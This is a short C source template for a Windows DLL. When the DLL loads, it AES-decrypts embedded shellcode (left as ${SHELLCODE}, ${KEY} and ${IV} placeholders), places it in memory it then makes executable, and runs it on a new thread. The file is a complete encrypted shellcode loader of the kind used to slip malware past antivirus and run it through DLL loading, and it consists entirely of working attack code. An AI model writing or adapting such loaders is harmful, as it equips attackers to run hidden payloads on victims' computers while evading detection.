#include <windows.h>
#include <bcrypt.h>

unsigned char shellcode[] = { ${SHELLCODE} };
unsigned char key[]       = { ${KEY} };
unsigned char iv[]        = { ${IV} };

static void AESDecrypt(unsigned char *data, DWORD data_len,
                       unsigned char *k, unsigned char *iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    ULONG cbResult         = 0;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                      sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, k, 32, 0);
    BCryptDecrypt(hKey, data, data_len, NULL, iv, 16,
                  data, data_len, &cbResult, 0);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
}

static DWORD WINAPI Run(LPVOID lpParam) {
    AESDecrypt(shellcode, sizeof(shellcode), key, iv);

    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!addr)
        return 1;

    memcpy(addr, shellcode, sizeof(shellcode));

    DWORD oldProt = 0;
    VirtualProtect(addr, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProt);

    ((void(*)())addr)();
    return 0;
}

BOOL WINAPI DllMainCRTStartup(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        CreateThread(NULL, 0, Run, NULL, 0, NULL);
    }
    return TRUE;
}
